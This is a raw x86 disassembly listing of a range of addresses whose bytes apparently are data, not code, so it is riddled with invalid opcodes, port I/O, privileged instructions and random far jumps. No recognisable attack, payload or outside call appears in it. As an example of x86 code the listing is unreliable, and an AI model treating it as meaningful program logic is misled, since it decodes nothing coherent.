  48a57f:	add    al,0x40
  48a581:	add    al,BYTE PTR [eax+0x4a81dc00]
  48a587:	jg     0x48a514
  48a589:	fidivr DWORD PTR [ecx-0xd]
  48a58c:	xor    al,BYTE PTR [eax+0x1a17e7c4]
  48a592:	popa   
  48a593:	inc    ebx
  48a594:	lods   eax,DWORD PTR ds:[esi]
  48a595:	and    DWORD PTR [edi],ecx
  48a597:	nop
  48a598:	inc    ebx
  48a599:	pop    edx
  48a59a:	addr16 retf 
  48a59c:	mov    eax,0x5a809bd6
  48a5a1:	dec    ebx
  48a5a2:	out    dx,eax
  48a5a3:	xchg   ebp,eax
  48a5a4:	(bad)  
  48a5a5:	pop    eax
  48a5a6:	push   edx
  48a5a7:	scas   eax,DWORD PTR es:[edi]
  48a5a8:	lock arpl WORD PTR ds:0xfe2e43e4,ax
  48a5af:	imul   ebx,DWORD PTR [eax+eiz*1+0x34],0x8
  48a5b4:	out    dx,eax
  48a5b5:	test   eax,0x97f23c09
  48a5ba:	mov    dl,0xc9
  48a5bc:	add    BYTE PTR [edx+ecx*4+0x5d],al
  48a5c0:	(bad)  
  48a5c1:	and    al,0x81
  48a5c3:	mov    edi,0x2df81135
  48a5c8:	jge    0x48a5f1
  48a5ca:	add    eax,0xfffffff8
  48a5cd:	xchg   ebx,eax
  48a5ce:	inc    eax
  48a5cf:	jae    0x48a64c
  48a5d1:	in     al,0x68
  48a5d3:	or     BYTE PTR [ebx],al
  48a5d5:	je     0x48a652
  48a5d7:	push   cs
  48a5d8:	push   edx
  48a5d9:	das    
  48a5da:	adc    ebp,ebp
  48a5dc:	lea    ebp,[edx]
  48a5de:	sti    
  48a5df:	dec    DWORD PTR [esi+esi*2+0x45d7db9a]
  48a5e6:	lock inc ebp
  48a5e8:	push   esi
  48a5e9:	inc    ecx
  48a5ea:	jge    0x48a607
  48a5ec:	shr    DWORD PTR [edx],cl
  48a5ee:	xchg   DWORD PTR [ebp*2+0x3e3c9188],esi
  48a5f5:	or     bl,BYTE PTR [edi-0x29228240]
  48a5fb:	mov    ah,0xbf
  48a5fd:	and    BYTE PTR [edx],bl
  48a5ff:	mov    ds:0x17aa3979,al
  48a604:	cli    
  48a605:	dec    esp
  48a606:	push   esi
  48a607:	nop
  48a608:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a609:	push   eax
  48a60a:	sbb    BYTE PTR [edx+0x119843a8],dh
  48a610:	xor    BYTE PTR [ebx-0x2d316070],0x96
  48a617:	jo     0x48a648
  48a619:	das    
  48a61a:	push   ecx
  48a61b:	mov    edx,DWORD PTR ds:0xb53243db
  48a621:	mov    esp,0xc380b825
  48a626:	add    al,0x81
  48a628:	cmp    eax,0x30b53279
  48a62d:	xor    eax,0xeb6afc0d
  48a632:	imul   ebx,edi,0xe1b40015
  48a638:	les    eax,FWORD PTR [ebx+0x352630c2]
  48a63e:	mov    eax,ds
  48a640:	dec    eax
  48a641:	jae    0x48a60b
  48a643:	jmp    0x48a69a
  48a645:	inc    ecx
  48a646:	inc    ecx
  48a647:	inc    ecx
  48a648:	dec    edi
  48a649:	nop
  48a64a:	jle    0x48a684
  48a64c:	in     al,0x60
  48a64e:	sub    eax,0xf06fe84b
  48a653:	ins    DWORD PTR es:[edi],dx
  48a654:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  48a655:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a656:	xor    cl,BYTE PTR [ebx-0x3d1f45b6]
  48a65c:	gs fucom st(1)
  48a65f:	nop
  48a660:	xlat   BYTE PTR ds:[ebx]
  48a661:	mov    al,0xeb
  48a663:	or     al,0xd6
  48a665:	xor    al,0x16
  48a667:	rol    bl,1
  48a669:	leave  
  48a66a:	xor    DWORD PTR [eax+0x14804c11],ecx
  48a670:	mov    DWORD PTR [ecx],ecx
  48a672:	ffreep st(4)
  48a674:	inc    edi
  48a675:	or     ch,BYTE PTR [eax+ecx*1-0x7fe7f2ce]
  48a67c:	in     al,dx
  48a67d:	ss ins BYTE PTR es:[edi],dx
  48a67f:	inc    esi
  48a680:	sbb    DWORD PTR cs:[ecx+0x24],edi
  48a684:	inc    eax
  48a685:	lock xor ah,0xd8
  48a689:	jle    0x48a701
  48a68b:	inc    ecx
  48a68c:	sbb    BYTE PTR [esi-0x68f814ed],ah
  48a692:	imul   ebx,DWORD PTR [esi],0xd0e1830e
  48a698:	add    BYTE PTR [esp+esi*8+0x51],al
  48a69c:	sbb    al,dh
  48a69e:	add    ch,bh
  48a6a0:	js     0x48a70b
  48a6a2:	pusha  
  48a6a3:	rol    DWORD PTR [esi-0x31],1
  48a6a6:	jns    0x48a6ae
  48a6a8:	or     bh,bl
  48a6aa:	es push edx
  48a6ac:	push   ecx
  48a6ad:	cvtps2pd xmm1,QWORD PTR [ebp-0x5c]
  48a6b1:	ror    BYTE PTR [eax+eiz*4],1
  48a6b4:	cmp    DWORD PTR [ecx-0x31],edi
  48a6b7:	cli    
  48a6b8:	in     al,dx
  48a6b9:	or     eax,0xcce0f06
  48a6be:	jno    0x48a670
  48a6c0:	jmp    0x1a0:0x22389b3
  48a6c7:	or     eax,esi
  48a6c9:	cmp    BYTE PTR [ebx+0x23],dl
  48a6cc:	add    ah,BYTE PTR [ebp-0x6c1b6a33]
  48a6d2:	inc    ebp
  48a6d3:	daa    
  48a6d4:	clc    
  48a6d5:	inc    esp
  48a6d6:	cmp    BYTE PTR [esi-0x59],bl
  48a6d9:	jge    0x48a6f6
  48a6db:	add    cl,bh
  48a6dd:	add    ecx,DWORD PTR [edi]
  48a6df:	mov    bh,0xc0
  48a6e1:	sbb    al,0xf6
  48a6e3:	lea    edi,[eax]
  48a6e5:	pop    es
  48a6e6:	(bad)
  48a6eb:	lock loopne 0x48a754
  48a6ee:	or     esi,0x1fe7eb18
  48a6f4:	in     al,dx
  48a6f5:	sub    al,0x61
  48a6f7:	mov    cl,0x54
  48a6f9:	das    
  48a6fa:	inc    eax
  48a6fb:	jmp    0x48a6cc
  48a6fd:	mov    ecx,0x617c90b4
  48a702:	lock xor BYTE PTR [esi+0x50223f4],dh
  48a709:	and    edx,edi
  48a70b:	popf   
  48a70c:	aaa    
  48a70d:	lock dec edx
  48a70f:	retf   
  48a710:	jne    0x48a73e
  48a712:	mov    bx,0xf59a
  48a716:	out    dx,al
  48a717:	fdiv   QWORD PTR [edi-0x1afd93d7]
  48a71d:	sbb    eax,0xc37f6f4a
  48a722:	xchg   edx,eax
  48a723:	(bad)  
  48a724:	or     di,bx
  48a727:	jmp    0x48a731
  48a729:	inc    ebx
  48a72a:	(bad)  
  48a72b:	sti    
  48a72c:	push   esi
  48a72d:	add    dh,BYTE PTR [ebp+0x68]
  48a730:	arpl   WORD PTR [eax-0x57ff0ade],dx
  48a736:	ins    DWORD PTR es:[edi],dx
  48a737:	and    eax,0x306fcd18
  48a73c:	mov    al,0xfb
  48a73e:	mov    ecx,0x8b40a15e
  48a743:	inc    DWORD PTR [ecx]
  48a745:	ss mov cl,0x95
  48a748:	mov    al,ds:0xb1ded220
  48a74d:	add    DWORD PTR [ecx],esp
  48a74f:	sbb    al,BYTE PTR [ebx]
  48a751:	and    eax,ebx
  48a753:	xor    al,0x5f
  48a756:	ret    0x5284
  48a759:	fcmovbe st,st(7)
  48a75b:	in     al,0x18
  48a75d:	dec    eax
  48a75e:	ret    0x3a2c
  48a761:	nop
  48a762:	cmc    
  48a763:	or     al,0x7f
  48a765:	adc    al,0xf5
  48a767:	add    al,0x18
  48a769:	inc    esp
  48a76a:	push   edi
  48a76b:	mov    al,BYTE PTR [eax+0x3f]
  48a76e:	sbb    bh,0x7d
  48a771:	xor    eax,0xff423aa2
  48a776:	ja     0x48a79c
  48a778:	sbb    dl,BYTE PTR [edi+edi*8]
  48a77b:	xor    bh,bh
  48a77d:	pusha  
  48a77e:	xor    eax,0x746db020
  48a783:	add    al,0x88
  48a785:	pop    edx
  48a786:	inc    DWORD PTR [ebx]
  48a788:	jne    0x48a795
  48a78a:	and    eax,0x619fd85c
  48a78f:	xor    al,0x3b
  48a791:	add    edi,DWORD PTR [edi-0x3e]
  48a794:	mov    ch,BYTE PTR [edx]
  48a796:	ret    
  48a797:	or     DWORD PTR [eax+0x2c],edx
  48a79a:	lahf   
  48a79b:	pop    ds
  48a79c:	call   0x35239859
  48a7a1:	push   esi
  48a7a2:	inc    ecx
  48a7a3:	adc    eax,0x59d7bdb
  48a7a8:	ret    0x31d6
  48a7ab:	(bad)  
  48a7ac:	ins    DWORD PTR es:[edi],dx
  48a7ad:	clc    
  48a7ae:	daa    
  48a7af:	mov    al,ds:0xa830085
  48a7b4:	sub    bl,BYTE PTR [ebx+0x15]
  48a7b7:	push   edx
  48a7b8:	jp     0x48a7d9
  48a7ba:	inc    eax
  48a7bb:	jmp    0x297:0x859af303
  48a7c2:	adc    BYTE PTR fs:[edx],ch
  48a7c5:	jmp    0x48a7c6
  48a7c7:	cmp    edx,ecx
  48a7c9:	inc    eax
  48a7ca:	and    eax,0x63827e42
  48a7cf:	fcmovu st,st(2)
  48a7d1:	ins    BYTE PTR es:[edi],dx
  48a7d2:	xor    BYTE PTR [esi+eiz*1-0x6],al
  48a7d6:	sub    BYTE PTR [ebp-0x14],dh
  48a7d9:	jne    0x48a7de
  48a7db:	mov    bl,0xed
  48a7dd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a7de:	in     al,dx
  48a7df:	outs   dx,DWORD PTR ds:[esi]
  48a7e0:	sub    ebp,ebx
  48a7e2:	inc    eax
  48a7e3:	cmp    al,BYTE PTR [ecx]
  48a7e5:	or     eax,0x770ab4ec
  48a7ea:	adc    al,0x70
  48a7ec:	pop    esp
  48a7ed:	mov    dh,0xe5
  48a7ef:	pop    ebp
  48a7f0:	mov    ebx,0x54f2b47d
  48a7f5:	pop    ecx
  48a7f6:	xor    ch,dl
  48a7f8:	jmp    0x48a818
  48a7fa:	ss jmp 0x48a86b
  48a7fd:	xor    ch,ah
  48a7ff:	rcr    cl,cl
  48a801:	arpl   WORD PTR [edi],sp
  48a803:	push   edx
  48a804:	xor    eax,0xc95aff03
  48a809:	pop    ss
  48a80a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a80b:	jmp    0x48a843
  48a80d:	pop    es
  48a80e:	cmp    dh,BYTE PTR [esi-0x1a]
  48a811:	aaa    
  48a812:	in     al,dx
  48a813:	xlat   BYTE PTR ds:[ebx]
  48a814:	adc    edx,esi
  48a816:	add    ah,dh
  48a818:	mov    dh,0x39
  48a81a:	in     eax,0x80
  48a81c:	fnstenv [esi+0x5f]
  48a81f:	add    BYTE PTR [ecx+0x72],dh
  48a822:	repz dec esp
  48a824:	adc    BYTE PTR [esi+eax*2+0x47479c20],dl
  48a82b:	mov    ah,0x7c
  48a82e:	pushf  
  48a82f:	das    
  48a830:	pop    eax
  48a831:	repnz inc ebx
  48a833:	je     0x48a886
  48a835:	pop    edx
  48a836:	(bad)  [edi+0x2c8b9578]
  48a83c:	loop   0x48a7cc
  48a83e:	sub    BYTE PTR [eax+0x19a4df10],0x42
  48a845:	dec    edx
  48a846:	dec    edi
  48a847:	and    BYTE PTR [eax],0xf7
  48a84a:	mov    al,0x61
  48a84c:	cs fs stos DWORD PTR es:[edi],eax
  48a84f:	add    al,0x43
  48a851:	test   BYTE PTR [esi],al
  48a853:	mov    al,0x6
  48a855:	inc    eax
  48a856:	sub    ebx,ebp
  48a858:	mov    ecx,DWORD PTR [ebp+0x44]
  48a85b:	inc    edi
  48a85c:	sbb    ebp,edx
  48a85e:	inc    eax
  48a85f:	imul   ecx,edi,0x23576042
  48a865:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a866:	cmp    BYTE PTR [edi],bl
  48a868:	test   al,0x5f
  48a86a:	leave  
  48a86b:	add    BYTE PTR [edx+0x19],dh
  48a86e:	push   0x39
  48a870:	rcl    BYTE PTR [edx-0x74b0c565],1
  48a876:	inc    eax
  48a877:	je     0x48a829
  48a879:	add    esp,esp
  48a87b:	adc    BYTE PTR [ecx-0x2d10e121],0x2e
  48a882:	mov    eax,ds:0x6669b340
  48a887:	sbb    BYTE PTR cs:[esi+0x78c48199],0x3d
  48a88f:	inc    esi
  48a890:	fnstcw WORD PTR [esp+ebx*1+0x4867fdab]
  48a897:	ins    BYTE PTR es:[edi],dx
  48a898:	movzx  edx,BYTE PTR [edx+0x3f]
  48a89c:	cmp    eax,edx
  48a89e:	(bad)  
  48a8a0:	xchg   BYTE PTR [eax+0x650cc0da],dh
  48a8a6:	sub    eax,0x361abc15
  48a8ab:	inc    ebp
  48a8ac:	inc    eax
  48a8ad:	je     0x48a916
  48a8af:	shl    BYTE PTR [eax],0x47
  48a8b2:	xchg   edx,eax
  48a8b3:	mov    ah,0x91
  48a8b5:	ss pushw 0x6684
  48a8ba:	push   0x60
  48a8bc:	leave  
  48a8bd:	add    al,0x9c
  48a8bf:	xchg   esp,eax
  48a8c0:	pop    ds
  48a8c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  48a8c3:	mov    ah,0x92
  48a8c5:	adc    ecx,DWORD PTR [eax-0x6f8d9700]
  48a8cb:	sub    DWORD PTR [edi+0x78],esi
  48a8ce:	test   al,0x0
  48a8d0:	nop
  48a8d1:	jl     0x48a894
  48a8d3:	dec    ecx
  48a8d4:	pop    edi
  48a8d5:	add    al,0x16
  48a8d7:	pushf  
  48a8d8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48a8d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48a8da:	xchg   edx,eax
  48a8db:	shl    BYTE PTR [edi+edx*8],cl
  48a8de:	add    al,0x17
  48a8e0:	or     al,0x94
  48a8e2:	mov    edx,0x3f9f2714
  48a8e7:	pusha  
  48a8e8:	jmp    0xb7d5b5c4
  48a8ed:	xor    BYTE PTR [esi],al
  48a8ef:	mov    edx,0x68547089
  48a8f4:	xor    eax,eax
  48a8f6:	dec    ecx
  48a8f7:	xlat   BYTE PTR ds:[ebx]
  48a8f8:	or     eax,0x5320c083
  48a8fd:	shr    DWORD PTR [edx+0x23],0x3f
  48a901:	cmp    al,0xe5
  48a903:	pusha  
  48a904:	inc    edi
  48a905:	cmp    ebx,DWORD PTR [eax]
  48a907:	mov    WORD PTR [edi-0xd97c0c0],es
  48a90d:	add    eax,0x457a531
  48a912:	sbb    BYTE PTR [eax+ebp*2+0x72],bh
  48a916:	in     al,0x41
  48a918:	mov    BYTE PTR [eax],al
  48a91a:	mov    WORD PTR [eax],es
  48a91c:	lahf   
  48a91d:	test   BYTE PTR [ebx+0x43c61f66],0x3e
  48a924:	add    DWORD PTR [esi],eax
  48a926:	cmp    DWORD PTR [ebx],edi
  48a928:	add    cl,BYTE PTR [ebx]
  48a92a:	mov    WORD PTR [ebp+0x3f023c36],?
  48a930:	xor    al,0x66
  48a932:	rol    bh,1
  48a934:	inc    ebx
  48a935:	cs callw 0xe9ba
  48a93a:	mov    dh,0x41
  48a93c:	js     0x48a972
  48a93e:	inc    ebx
  48a93f:	pop    bp
  48a941:	pushf  
  48a942:	inc    edx
  48a943:	cmp    DWORD PTR [ecx-0x72e1eb30],ecx
  48a949:	inc    eax
  48a94a:	out    0xf6,eax
  48a94c:	mov    eax,edx
  48a94e:	iret   
  48a94f:	cmp    BYTE PTR [ebx-0x609bbefc],cl
  48a955:	sbb    al,0x24
  48a957:	push   ecx
  48a958:	or     eax,0x1b1a7c04
  48a95d:	int3   
  48a95e:	(bad)  
  48a95f:	jmp    0x48a9d1
  48a961:	and    DWORD PTR [edx+edx*1-0x771e3345],edi
  48a968:	push   0xffffffdf
  48a96a:	push   ds
  48a96b:	mov    ebx,0x83e77f4c
  48a970:	jle    0x48a9a6
  48a972:	(bad)  
  48a973:	adc    bl,BYTE PTR ds:0xf99d800b
  48a979:	sti    
  48a97a:	loopne 0x48a9f4
  48a97c:	and    ecx,DWORD PTR [esi+eiz*4+0x5c044dd0]
  48a983:	inc    ecx
  48a984:	inc    esi
  48a985:	push   0xc565bb69
  48a98a:	adc    BYTE PTR [esi],cl
  48a98c:	js     0x48a96e
  48a98e:	xchg   edx,eax
  48a98f:	xor    bl,BYTE PTR [esi+0x2e6650d6]
  48a995:	xchg   DWORD PTR [ecx+0x3a],esi
  48a998:	mov    al,0x9e
  48a99a:	xor    ecx,ecx
  48a99c:	add    DWORD PTR [esi+0x4c],eax
  48a99f:	jecxz  0x48a94c
  48a9a1:	pop    ecx
  48a9a2:	add    BYTE PTR [edx],dl
  48a9a4:	imul   eax,DWORD PTR [edx],0x34
  48a9a7:	sbb    cx,WORD PTR [edi-0x2e]
  48a9ab:	fwait
  48a9ac:	inc    eax
  48a9ad:	cmp    edi,eax
  48a9af:	rol    BYTE PTR [eax+edi*8],0xb6
  48a9b3:	hlt    
  48a9b4:	es pushf 
  48a9b6:	enter  0xd775,0xa
  48a9ba:	jne    0x48a93c
  48a9bc:	jnp    0x48a9c1
  48a9be:	add    cl,BYTE PTR [esi+0x4]
  48a9c1:	mov    dl,0x50
  48a9c3:	jp     0x48a945
  48a9c5:	les    eax,FWORD PTR [eax]
  48a9c7:	dec    ebp
  48a9c8:	xor    BYTE PTR [edi],bl
  48a9ca:	or     DWORD PTR [eax+esi*2],edi
  48a9cd:	mov    ds:0xfd137e69,eax
  48a9d2:	sub    al,0xdc
  48a9d4:	sub    DWORD PTR [eax],eax
  48a9d6:	call   0x6c9395b6
  48a9db:	cmp    eax,0x60a8d036
  48a9e0:	out    dx,al
  48a9e1:	jae    0x48aa47
  48a9e3:	enter  0xa032,0x60
  48a9e7:	mov    al,ds:0x367a649c
  48a9ec:	xchg   BYTE PTR [edx-0x28],dl
  48a9ef:	popa   
  48a9f0:	jo     0x48a9e9
  48a9f2:	pop    ebx
  48a9f3:	jne    0x48a9f7
  48a9f5:	or     esi,edi
  48a9f7:	sbb    BYTE PTR [esi+0x68],ch
  48a9fa:	lock mov esi,0x184ed52
  48aa00:	and    BYTE PTR [esi-0x48],0x4a
  48aa04:	shr    BYTE PTR es:[ecx-0x6c],0x0
  48aa09:	jo     0x48a9c7
  48aa0b:	add    DWORD PTR [esi-0x3c91d8f8],edi
  48aa11:	add    BYTE PTR [esi],0xf0
  48aa14:	mov    DWORD PTR [ebp-0x39],0xf484002c
  48aa1b:	loopne 0x48aa09
  48aa1d:	or     eax,0x1d053fcb
  48aa22:	add    bl,BYTE PTR [edi-0xd]
  48aa25:	ss out dx,al
  48aa27:	aam    0x11
  48aa29:	cmp    BYTE PTR [esi+0x40],0x21
  48aa2d:	and    eax,0x82a40114
  48aa32:	inc    edi
  48aa33:	stos   BYTE PTR es:[edi],al
  48aa34:	push   ss
  48aa35:	adc    BYTE PTR [ebp+ecx*4-0x6d],cl
  48aa39:	cdq    
  48aa3a:	inc    eax
  48aa3b:	mov    eax,ds:0x1743f4c
  48aa40:	out    dx,al
  48aa41:	outs   dx,DWORD PTR ds:[esi]
  48aa42:	add    bl,BYTE PTR [eax+0x30]
  48aa45:	mov    edx,0xa113fcfc
  48aa4a:	adc    al,0xa1
  48aa4c:	rol    BYTE PTR [esi],0x94
  48aa4f:	and    eax,0x90176563
  48aa54:	dec    eax
  48aa55:	ins    BYTE PTR es:[edi],dx
  48aa56:	push   ebx
  48aa57:	cmp    eax,0x9ddfe7c4
  48aa5c:	add    dl,BYTE PTR [edi]
  48aa5e:	leave  
  48aa5f:	mov    cl,BYTE PTR [ebx+0x48]
  48aa62:	or     edx,DWORD PTR [ecx*4+0x3cc20b1c]
  48aa69:	in     eax,dx
  48aa6a:	xor    eax,0x50ffc45f
  48aa6f:	dec    ebx
  48aa70:	push   ss
  48aa71:	neg    DWORD PTR [eax-0x44]
  48aa74:	pop    es
  48aa75:	mov    ds:0x12cfeae0,eax
  48aa7a:	cmp    BYTE PTR [eax-0x1221a3d8],al
  48aa80:	popf   
  48aa81:	cmp    DWORD PTR [eax+edi*1],esi
  48aa84:	pop    ss
  48aa85:	cmp    cl,BYTE PTR [eax+esi*1-0x2d]
  48aa89:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48aa8a:	cdq    
  48aa8b:	out    0x50,al
  48aa8d:	inc    esp
  48aa8e:	into   
  48aa8f:	pop    edx
  48aa90:	xlat   BYTE PTR ds:[ebx]
  48aa91:	or     bl,bl
  48aa93:	jecxz  0x48aa45
  48aa95:	or     DWORD PTR [edx-0x21],0x2436d9e3
  48aa9c:	cdq    
  48aa9d:	xchg   bl,ch
  48aa9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  48aaa0:	or     ah,BYTE PTR [esi]
  48aaa2:	(bad)  
  48aaa3:	push   eax
  48aaa4:	add    al,0x84
  48aaa6:	pop    eax
  48aaa7:	add    ah,BYTE PTR [edi-0x40fbfc36]
  48aaad:	sar    dl,1
  48aaaf:	mov    ch,0x7d
  48aab1:	xor    al,0x85
  48aab3:	adc    al,0xf0
  48aab5:	mov    ecx,0x4812073d
  48aaba:	or     bl,bh
  48aabc:	cmp    al,bh
  48aabe:	imul   ecx,DWORD PTR [edx-0x78],0x6
  48aac2:	push   ebx
  48aac3:	sub    eax,DWORD PTR [eax]
  48aac5:	xchg   ebp,eax
  48aac6:	lock push edx
  48aac8:	jnp    0x48aa8e
  48aaca:	dec    ebp
  48aacb:	adc    edx,DWORD PTR [ebx+ebx*8]
  48aace:	pop    ds
  48aacf:	mov    al,ds:0x8218edf5
  48aad4:	outs   dx,DWORD PTR ds:[esi]
  48aad5:	jg     0x48ab27
  48aad7:	or     esi,0x10
  48aada:	push   esi
  48aadb:	in     eax,0x0
  48aadd:	jmp    0x48aaf6
  48aadf:	inc    ebp
  48aae0:	push   eax
  48aae1:	mov    eax,0x83358d2c
  48aae6:	push   eax
  48aae7:	xor    DWORD PTR [ebx+0x79a40113],ecx
  48aaed:	fimul  WORD PTR [edx]
  48aaef:	inc    esp
  48aaf0:	shl    BYTE PTR [esi-0x57],0xc1
  48aaf4:	or     edi,ebx
  48aaf6:	test   eax,0x88e84917
  48aafb:	call   0x7800:0x7690972d
  48ab02:	xchg   esp,eax
  48ab03:	dec    edx
  48ab04:	sti    
  48ab05:	in     eax,0xa4
  48ab07:	xchg   edx,eax
  48ab08:	nop
  48ab09:	jge    0x48aad3
  48ab0b:	clc    
  48ab0c:	js     0x48aac8
  48ab0e:	xchg   DWORD PTR [ecx+0x6],eax
  48ab11:	jge    0x48ab5c
  48ab13:	pop    ecx
  48ab14:	pop    eax
  48ab15:	jo     0x48ab55
  48ab17:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  48ab18:	and    BYTE PTR [ebx+edi*2],0xa3
  48ab1c:	jo     0x48ab15
  48ab1e:	mov    edi,0x3d876383
  48ab23:	add    al,0x23
  48ab25:	hlt    
  48ab26:	adc    ebp,DWORD PTR [eax]
  48ab28:	lock pop ebp
  48ab2a:	or     ecx,ebp
  48ab2c:	test   eax,eax
  48ab2e:	push   0x95c34e8
  48ab33:	scas   eax,DWORD PTR es:[edi]
  48ab34:	push   edi
  48ab35:	xchg   BYTE PTR ds:0x14b868ad,ch
  48ab3b:	lods   al,BYTE PTR ds:[esi]
  48ab3c:	dec    ebp
  48ab3d:	cld    
  48ab3e:	or     DWORD PTR [eax],ebp
  48ab40:	xchg   edx,eax
  48ab41:	je     0x48ab87
  48ab43:	mov    ah,0xbe
  48ab45:	out    dx,eax
  48ab46:	mov    es,WORD PTR [ebx]
  48ab48:	and    al,0x6e
  48ab4a:	(bad)  
  48ab4b:	inc    eax
  48ab4c:	cmc    
  48ab4d:	(bad)  
  48ab4e:	adc    esp,DWORD PTR [ecx+0x0]
  48ab51:	dec    ebp
  48ab52:	push   ebx
  48ab53:	outs   dx,DWORD PTR ds:[esi]
  48ab54:	movups XMMWORD PTR [ecx],xmm6
  48ab57:	ror    BYTE PTR [eax+0x440bdd93],0x40
  48ab5e:	push   ds
  48ab5f:	sbb    BYTE PTR [eax],ah
  48ab61:	pop    ss
  48ab62:	(bad)  
  48ab63:	shl    BYTE PTR [eax],0x3e
  48ab66:	cld    
  48ab67:	test   BYTE PTR [edx+0x6a],0xaa
  48ab6b:	rol    BYTE PTR [esi+0x23603a53],cl
  48ab71:	fnstcw WORD PTR [edi]
  48ab73:	popa   
  48ab74:	ret    
  48ab75:	aas    
  48ab76:	cmp    ch,BYTE PTR [ebx+ecx*4-0x3e]
  48ab7a:	mov    DWORD PTR [edx],esp
  48ab7c:	mov    ecx,0x1af1c205
  48ab81:	or     cl,BYTE PTR [ecx+0x7a09ff9e]
  48ab87:	rcl    BYTE PTR [edi],0xf
  48ab8a:	cld    
  48ab8b:	pop    eax
  48ab8c:	mov    edi,0x15baf6d0
  48ab91:	out    dx,eax
  48ab92:	jecxz  0x48abb0
  48ab94:	push   esi
  48ab95:	push   ss
  48ab96:	adc    eax,0x48895541
  48ab9b:	out    dx,eax
  48ab9c:	push   edx
  48ab9d:	je     0x48ab42
  48ab9f:	and    al,0xd8
  48aba1:	outs   dx,BYTE PTR ds:[esi]
  48aba2:	ret    
  48aba3:	jp     0x48abfc
  48aba5:	aaa    
  48aba6:	xchg   BYTE PTR [ebp+edi*2-0x13ba0918],dh
  48abad:	jne    0x3471bdd5
  48abb3:	aas    
  48abb4:	mov    BYTE PTR [edx],al
  48abb6:	inc    eax
  48abb7:	je     0x48abba
  48abb9:	std    
  48abba:	adc    al,0xb3
  48abbc:	out    0xba,eax
  48abbe:	xchg   edx,eax
  48abbf:	ins    BYTE PTR es:[edi],dx
  48abc0:	out    dx,eax
  48abc1:	pop    ebx
  48abc2:	and    ebp,eax
  48abc4:	jmp    DWORD PTR [esi+0x14]
  48abc7:	pushf  
  48abc8:	mov    esi,0xaf285a98
  48abcd:	dec    eax
  48abce:	or     BYTE PTR [ecx+0x2600a3fd],al
  48abd4:	push   0x574ffe61
  48abd9:	inc    ecx
  48abda:	rcr    BYTE PTR [esi-0x57bf3d66],0x56
  48abe1:	xor    ebp,DWORD PTR ds:0xf1b45f85
  48abe7:	pop    esp
  48abe8:	or     BYTE PTR [ebx+0x34cc7f22],dh
  48abee:	or     DWORD PTR [ebx-0x7cb647e5],ebp
  48abf4:	jge    0x48abf4
  48abf6:	mov    al,ds:0x2c4ab170
  48abfb:	push   ecx
  48abfc:	gs iret 
  48abfe:	pop    eax
  48abff:	je     0x48ac5b
  48ac01:	add    BYTE PTR [ecx+0x3427d18e],al
  48ac07:	ds inc ebp
  48ac09:	jne    0x48ac79
  48ac0b:	fiadd  DWORD PTR [ecx-0x5]
  48ac0e:	adc    ch,al
  48ac10:	xlat   BYTE PTR ds:[ebx]
  48ac11:	and    ebp,esi
  48ac13:	and    BYTE PTR [ebx-0xe2618a3],bh
  48ac19:	mov    DWORD PTR [edi],eax
  48ac1b:	adc    DWORD PTR [edi],ebx
  48ac1d:	mov    ecx,0x43cdc2c
  48ac22:	dec    edi
  48ac23:	inc    eax
  48ac24:	cmp    ebp,DWORD PTR [esp]
  48ac27:	les    edi,FWORD PTR [edi]
  48ac29:	and    eax,0xbbd544aa
  48ac2e:	cmp    bl,BYTE PTR [eax+0x3f]
  48ac31:	jae    0x48ac59
  48ac33:	mov    eax,ds:0xbf60f648
  48ac38:	xchg   BYTE PTR [esi],al
  48ac3a:	mov    edx,0x7633eb30
  48ac3f:	or     al,0x1b
  48ac41:	test   BYTE PTR [eax],dl
  48ac43:	test   BYTE PTR [ecx],bh
  48ac45:	mov    BYTE PTR [esi],al
  48ac47:	clc    
  48ac48:	add    al,0xb0
  48ac4a:	nop
  48ac4b:	xchg   DWORD PTR [esi+0x34],ebx
  48ac4e:	or     DWORD PTR [ecx+0x36],0x2f
  48ac52:	cmp    ecx,DWORD PTR fs:[ebx-0x5abfbbd]
  48ac59:	or     bh,BYTE PTR [ebx]
  48ac5b:	ja     0x48ac17
  48ac5d:	xchg   ebp,eax
  48ac5e:	inc    esi
  48ac5f:	mov    al,0xd8
  48ac61:	jmp    0x48ac6b
  48ac63:	adc    ebp,DWORD PTR [eax+0x10f04253]
  48ac69:	test   BYTE PTR [edx],0xa1
  48ac6c:	xor    al,0xc5
  48ac6e:	in     eax,dx
  48ac6f:	rol    WORD PTR [ecx+0x8],1
  48ac73:	inc    esi
  48ac74:	out    0xff,al
  48ac76:	js     0x48accc
  48ac78:	sbb    ah,al
  48ac7a:	nop
  48ac7b:	cmp    al,0x8c
  48ac7d:	ds and dh,bh
  48ac80:	xchg   esp,eax
  48ac81:	in     al,0xba
  48ac83:	dec    ebp
  48ac84:	push   cs
  48ac85:	inc    esp
  48ac86:	or     al,0x3
  48ac88:	mov    bh,0xc2
  48ac8a:	daa    
  48ac8b:	jmp    0xb1c7:0x4602ec2d
  48ac92:	inc    esi
  48ac93:	pop    edx
  48ac94:	pusha  
  48ac95:	add    eax,0xf4e43fcf
  48ac9a:	ss cmp cl,ah
  48ac9d:	push   ss
  48ac9e:	adc    DWORD PTR [ebp+0x8],ebx
  48aca1:	cmp    eax,DWORD PTR [eax]
  48aca3:	adc    BYTE PTR [ecx],bl
  48aca5:	pop    ds
  48aca6:	pusha  
  48aca7:	inc    ecx
  48aca8:	xchg   esp,eax
  48aca9:	adc    eax,edi
  48acab:	and    eax,0xe8a5230d
  48acb0:	cs loope 0x48aca5
  48acb3:	shr    BYTE PTR [edx-0x6e],1
  48acb6:	xor    BYTE PTR [esi+ebp*2+0x1261ffe3],dh
  48acbd:	mov    ah,0x48
  48acbf:	shr    bl,cl
  48acc1:	adc    BYTE PTR [ebx],cl
  48acc3:	loopne 0x48acc5
  48acc5:	fdiv   QWORD PTR [esi+eax*1-0x7eff02de]
  48accc:	retf   
  48accd:	and    bh,BYTE PTR [esi-0x689351fb]
